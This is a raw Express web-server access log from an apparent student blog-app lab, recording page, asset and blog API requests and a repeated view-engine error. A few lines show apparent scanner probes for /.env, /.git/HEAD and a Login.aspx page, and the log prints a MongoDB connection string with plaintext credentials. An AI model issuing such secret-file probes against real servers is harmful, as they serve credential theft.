Port 80 is already in use
[0mGET / [32m200 [0m1.298 ms - 1573[0m
[0mGET /lib/angular.min.js [36m304 [0m0.616 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.595 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.598 ms - -[0m
[0mGET /pages/home.html [36m304 [0m0.612 ms - -[0m
[0mGET /pages/blogList.html [32m200 [0m1.693 ms - 818[0m
[0mGET /api/blogs [32m200 [0m23.285 ms - 260[0m
[0mGET /pages/blogAdd.html [32m200 [0m1.391 ms - 909[0m
[0mGET /api/blogs [36m304 [0m14.190 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.229 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.003 ms - -[0m
[0mGET /api/blogs [36m304 [0m5.913 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.820 ms - -[0m
[0mGET / [36m304 [0m0.744 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.654 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.541 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.543 ms - -[0m
[0mGET /pages/home.html [36m304 [0m0.535 ms - -[0m
[0mGET /pages/blogList.html [36m304 [0m0.648 ms - -[0m
[0mGET /api/blogs [36m304 [0m7.746 ms - -[0m
[0mGET /api/blogs [36m304 [0m6.286 ms - -[0m
[0mGET /pages/blogAdd.html [36m304 [0m0.537 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.280 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.298 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.093 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.577 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.818 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.884 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.601 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.822 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.664 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.703 ms - -[0m
[0mGET /blogList [32m200 [0m1.507 ms - 1573[0m
[0mGET /bloggerApp.js [36m304 [0m0.974 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.145 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.559 ms - -[0m
[0mGET /pages/blogList.html [32m200 [0m0.939 ms - 814[0m
[0mGET /api/blogs [36m304 [0m3.046 ms - -[0m
[0mGET /pages/blogAdd.html [32m200 [0m0.877 ms - 907[0m
[0mGET /pages/home.html [36m304 [0m0.567 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.584 ms - -[0m
[0mGET /pages/blogEdit.html [32m200 [0m1.980 ms - 1573[0m
[0mGET /blogEdit/65df83a56fa3991bee449513 [32m200 [0m1.076 ms - 1573[0m
[0mGET / [36m304 [0m0.647 ms - -[0m
[0mGET /blogEdit/65df83a56fa3991bee449513 [36m304 [0m0.670 ms - -[0m
[0mGET /blogEdit/65df83a56fa3991bee449513 [36m304 [0m0.682 ms - -[0m
[0mGET / [36m304 [0m0.506 ms - -[0m
[0mGET / [36m304 [0m1.502 ms - -[0m
Mongoose connected to mongodb://blogs:blogs@localhost:27017/Blogger
[0mGET / [36m304 [0m3.685 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.945 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m2.080 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.792 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.749 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.249 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.668 ms - -[0m
[0mGET /api/blogs [36m304 [0m11.478 ms - -[0m
[0mGET /api/blogs [36m304 [0m5.731 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.162 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.957 ms - -[0m
[0mGET /api/blogs/65f9edc65f305411211ee392 [36m304 [0m4.579 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.894 ms - -[0m
[0mGET /api/blogs/65f9edc65f305411211ee392 [36m304 [0m3.959 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.972 ms - -[0m
[0mGET /api/blogs/65f9edc65f305411211ee392 [36m304 [0m3.232 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.982 ms - -[0m
[0mGET /api/blogs/65f9edc65f305411211ee392 [36m304 [0m3.229 ms - -[0m
[0mDELETE /api/blogs/65f9edc65f305411211ee392 [32m204 [0m12.579 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.457 ms - 2[0m
[0mPOST /api/blogs [32m201 [0m24.282 ms - 117[0m
[0mGET /api/blogs [32m200 [0m3.723 ms - 119[0m
[0mGET /api/blogs [32m200 [0m30.336 ms - 119[0m
[0mGET / [33m404 [0m2.644 ms - 1224[0m
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/421Lab/lab4/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/421Lab/lab4/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/421Lab/lab4/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/421Lab/lab4/app.js:50:7
    at Layer.handle_error (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/layer.js:67:12)
[0mGET / [33m404 [0m1.424 ms - 1224[0m
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/421Lab/lab4/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/421Lab/lab4/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/421Lab/lab4/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/421Lab/lab4/app.js:50:7
    at Layer.handle_error (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/421Lab/lab4/node_modules/express/lib/router/layer.js:67:12)
[0mGET / [32m200 [0m3.400 ms - 5610[0m
[0mGET /stylesheets/style.css [36m304 [0m0.588 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.505 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.066 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.527 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m0.873 ms - 4284[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.465 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.023 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.711 ms - -[0m
[0mGET / [32m200 [0m0.825 ms - 5610[0m
[0mGET /stylesheets/style.css [36m304 [0m0.569 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.909 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.461 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m4.762 ms - 4284[0m
[0mGET /lib/angular-route.min.js [36m304 [0m8.175 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.374 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.922 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.847 ms - -[0m
[0mGET / [36m304 [0m0.571 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.424 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.397 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.118 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.399 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.370 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.475 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.945 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.583 ms - -[0m
[0mGET / [32m200 [0m1.293 ms - 5610[0m
[0mGET / [36m304 [0m0.603 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.031 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.382 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.594 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.195 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.536 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.441 ms - -[0m
[0mGET /api/blogs [36m304 [0m12.051 ms - -[0m
[0mGET / [32m200 [0m0.807 ms - 5610[0m
[0mGET /stylesheets/style.css [36m304 [0m0.414 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.651 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.026 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.767 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.415 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.579 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.410 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.784 ms - -[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.872 ms - 5610[0m
[0mGET / [32m200 [0m0.912 ms - 5610[0m
[0mGET /stylesheets/style.css [36m304 [0m0.374 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.352 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.437 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.870 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.552 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.336 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.319 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.623 ms - -[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [32m200 [0m5.974 ms - 117[0m
[0mGET /.env [32m200 [0m1.055 ms - 5610[0m
[0mPOST / [32m200 [0m3.182 ms - 5610[0m
[0mGET / [32m200 [0m1.428 ms - 5610[0m
[0mGET /stylesheets/style.css [32m200 [0m1.233 ms - 111[0m
[0mGET /css/fontawesome-all.css [32m200 [0m1.595 ms - 51609[0m
[0mGET /bloggerApp.js [32m200 [0m1.004 ms - 4284[0m
[0mGET /lib/angular-route.min.js [32m200 [0m1.624 ms - 5720[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.821 ms - 140930[0m
[0mGET /lib/angular.min.js [32m200 [0m2.461 ms - 177366[0m
[0mGET /favicon.ico [32m200 [0m0.903 ms - 5610[0m
[0mGET /api/blogs [36m304 [0m2.221 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.216 ms - -[0m
[0mGET / [32m200 [0m0.875 ms - 5628[0m
[0mGET /stylesheets/style.css [36m304 [0m1.036 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.560 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.636 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.430 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.071 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.813 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.493 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.163 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.380 ms - -[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [32m200 [0m3.481 ms - 117[0m
[0mGET /api/blogs [36m304 [0m2.288 ms - -[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [36m304 [0m2.481 ms - -[0m
[0mPUT /api/blogs/65f9f13f57097bd3ec9d26cf [32m200 [0m7.825 ms - 118[0m
[0mGET /api/blogs [32m200 [0m2.386 ms - 120[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [32m200 [0m3.773 ms - 118[0m
[0mGET /api/blogs [36m304 [0m2.209 ms - -[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [36m304 [0m2.911 ms - -[0m
[0mGET / [32m200 [0m0.824 ms - 5646[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.450 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.393 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.445 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m0.361 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m0.346 ms - -[0m
[0mGET /api/blogs/65f9f13f57097bd3ec9d26cf [36m304 [0m4.666 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.193 ms - -[0m
Mongoose connected to mongodb://blogs:blogs@localhost:27017/Blogger
[0mGET /login [36m304 [0m6.499 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.407 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.478 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.761 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m2.136 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m2.817 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m3.173 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m1.804 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m2.180 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.468 ms - -[0m
[0mGET /api/blogs [36m304 [0m17.898 ms - -[0m
Mongoose connected to mongodb://blogs:blogs@localhost:27017/Blogger
[0mGET /login [36m304 [0m4.570 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.977 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.533 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.453 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m2.967 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.626 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m1.010 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m1.123 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.828 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.214 ms - -[0m
[0mGET /api/blogs [36m304 [0m15.860 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.035 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.348 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.585 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.411 ms - -[0m
Mongoose connected to mongodb://blogs:blogs@localhost:27017/Blogger
[0mGET /login [36m304 [0m22.676 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.879 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m2.436 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.587 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.872 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m2.917 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m2.971 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m2.839 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m2.921 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.426 ms - -[0m
[0mGET /api/blogs [36m304 [0m52.043 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m6.540 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.586 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m9.060 ms - -[0m
[0mGET /api/blogs [36m304 [0m7.829 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.561 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m36.779 ms - 395[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.887 ms - 395[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m9.684 ms - 380[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.448 ms - 380[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m8.593 ms - 380[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.257 ms - 380[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m9.992 ms - 383[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m6.757 ms - 383[0m
[0mGET /api/blogs [32m200 [0m5.013 ms - 385[0m
[0mGET /api/blogs [36m304 [0m4.410 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.901 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.914 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m6.106 ms - 394[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.429 ms - 394[0m
[0mDELETE /api/blogs/66147966c15659b60e0ff148/comments/66147b8a8f2e8d72f284e66d [32m200 [0m10.764 ms - 260[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/comments [32m200 [0m12.782 ms - 393[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m5.183 ms - 393[0m
[0mGET /api/blogs [32m200 [0m3.378 ms - 395[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.000 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.582 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.860 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.629 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.660 ms - -[0m
[0mGET /api/blogs [36m304 [0m6.241 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.800 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.119 ms - -[0m
Mongoose connected to mongodb://blogs:blogs@localhost:27017/Blogger
[0mGET /login [36m304 [0m21.437 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.284 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.769 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.789 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.644 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m7.913 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m8.026 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m7.937 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m8.776 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.951 ms - -[0m
[0mPOST /api/login [32m200 [0m120.296 ms - 225[0m
[0mGET /api/blogs [36m304 [0m11.712 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.230 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m5.159 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/comments [32m200 [0m40.264 ms - 531[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m5.605 ms - 531[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m12.729 ms - 532[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.268 ms - 532[0m
[0mGET /api/blogs [32m200 [0m3.805 ms - 534[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m4.189 ms - -[0m
[0mGET /api/blogs [36m304 [0m4.044 ms - -[0m
[0mGET /login [32m200 [0m2.070 ms - 11156[0m
[0mGET /stylesheets/style.css [36m304 [0m1.141 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.752 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.009 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m4.700 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m3.112 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m3.381 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m3.648 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m4.189 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.662 ms - -[0m
[0mGET /api/blogs [36m304 [0m12.019 ms - -[0m
[0mPOST /api/login [32m200 [0m22.016 ms - 229[0m
[0mGET /api/blogs [36m304 [0m4.843 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m2.984 ms - -[0m
[0mGET /api/blogs [36m304 [0m5.659 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.952 ms - -[0m
[0mPUT /api/blogs/66147966c15659b60e0ff148 [32m200 [0m7.254 ms - 531[0m
[0mGET /api/blogs [32m200 [0m3.580 ms - 533[0m
[0mGET /login [32m200 [0m1.532 ms - 11156[0m
[0mGET /stylesheets/style.css [32m200 [0m1.612 ms - 111[0m
[0mGET /common/nav/navigation.js [32m200 [0m2.259 ms - 823[0m
[0mGET /bloggerApp.js [32m200 [0m1.359 ms - 8831[0m
[0mGET /common/auth/authentication.js [32m200 [0m2.572 ms - 3292[0m
[0mGET /css/fontawesome-all.css [32m200 [0m2.560 ms - 51609[0m
[0mGET /lib/angular-route.min.js [32m200 [0m3.716 ms - 5720[0m
[0mGET /css/bootstrap.min.css [32m200 [0m4.851 ms - 140930[0m
[0mGET /lib/angular.min.js [32m200 [0m3.036 ms - 177366[0m
[0mGET /common/nav/navigation.html [32m200 [0m1.527 ms - 729[0m
[0mGET /favicon.ico [32m200 [0m0.972 ms - 11156[0m
[0mGET /api/blogs [32m200 [0m2.808 ms - 533[0m
[0mGET /login [36m304 [0m0.833 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m2.400 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m2.422 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m2.777 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.563 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.764 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.422 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.763 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m1.123 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.515 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.112 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.792 ms - 531[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m6.846 ms - 531[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m3.977 ms - 531[0m
[0mDELETE /api/blogs/66147966c15659b60e0ff148/comments/6614ba64c9d3b5533ecb7f5e [32m200 [0m11.660 ms - 393[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/comments [32m200 [0m13.791 ms - 532[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.221 ms - 532[0m
[0mGET /api/blogs [32m200 [0m8.909 ms - 534[0m
[0mPOST /api/login [32m200 [0m12.616 ms - 225[0m
[0mGET /login [36m304 [0m0.649 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.396 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.357 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.908 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m2.463 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m2.671 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m3.413 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m6.704 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m7.259 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.793 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.568 ms - 534[0m
[0mGET /api/blogs [36m304 [0m3.103 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.838 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m11.623 ms - 532[0m
[0mPOST /api/login [32m200 [0m16.011 ms - 229[0m
[0mGET /api/blogs [36m304 [0m5.181 ms - -[0m
[0mGET /.git/HEAD [32m200 [0m1.022 ms - 11156[0m
[0mPOST /api/login [32m200 [0m13.218 ms - 225[0m
[0mGET /api/blogs [36m304 [0m4.137 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m4.418 ms - -[0m
[0mGET /login [36m304 [0m0.821 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.595 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.380 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.658 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m3.208 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m3.081 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m2.524 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m2.889 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m3.391 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.894 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m4.045 ms - -[0m
[0mGET /login [36m304 [0m1.580 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.481 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.355 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.772 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m5.178 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m5.241 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m5.689 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.524 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.770 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m1.174 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [36m304 [0m3.999 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.557 ms - -[0m
[0mGET /login [36m304 [0m0.641 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.246 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.321 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.303 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m7.667 ms - -[0m
[0mGET /common/auth/authentication.js [36m304 [0m4.649 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m5.078 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m6.831 ms - -[0m
[0mGET /bloggerApp.js [36m304 [0m5.124 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.788 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.742 ms - -[0m
[0mGET /login [32m200 [0m1.214 ms - 11156[0m
[0mGET /stylesheets/style.css [32m200 [0m0.854 ms - 111[0m
[0mGET /css/fontawesome-all.css [32m200 [0m2.963 ms - 51609[0m
[0mGET /bloggerApp.js [32m200 [0m4.015 ms - 8831[0m
[0mGET /lib/angular-route.min.js [32m200 [0m4.054 ms - 5720[0m
[0mGET /common/nav/navigation.js [32m200 [0m4.225 ms - 823[0m
[0mGET /common/auth/authentication.js [32m200 [0m0.862 ms - 3292[0m
[0mGET /lib/angular.min.js [32m200 [0m0.741 ms - 177366[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.361 ms - 140930[0m
[0mGET /common/nav/navigation.html [32m200 [0m0.750 ms - 729[0m
[0mGET /favicon.ico [32m200 [0m1.128 ms - 11156[0m
[0mGET /favicon.ico [36m304 [0m0.668 ms - -[0m
[0mGET /favicon.ico [36m304 [0m2.296 ms - -[0m
[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.649 ms - 11156[0m
[0mPOST /api/login [33m401 [0m2.436 ms - 42[0m
[0mPOST /api/login [32m200 [0m17.824 ms - 225[0m
[0mGET /favicon.ico [36m304 [0m0.723 ms - -[0m
[0mGET /api/blogs [32m200 [0m2.714 ms - 534[0m
[0mGET /favicon.ico [36m304 [0m0.581 ms - -[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m9.202 ms - 532[0m
[0mGET /favicon.ico [36m304 [0m1.273 ms - -[0m
[0mPOST /api/blogs/66147966c15659b60e0ff148/rating [32m200 [0m5.530 ms - 518[0m
[0mGET /api/blogs/66147966c15659b60e0ff148 [32m200 [0m4.329 ms - 518[0m
[0mGET /api/blogs [32m200 [0m3.397 ms - 520[0m
[0mGET /favicon.ico [36m304 [0m0.630 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.700 ms - -[0m
[0mGET /api/blogs [36m304 [0m3.227 ms - -[0m
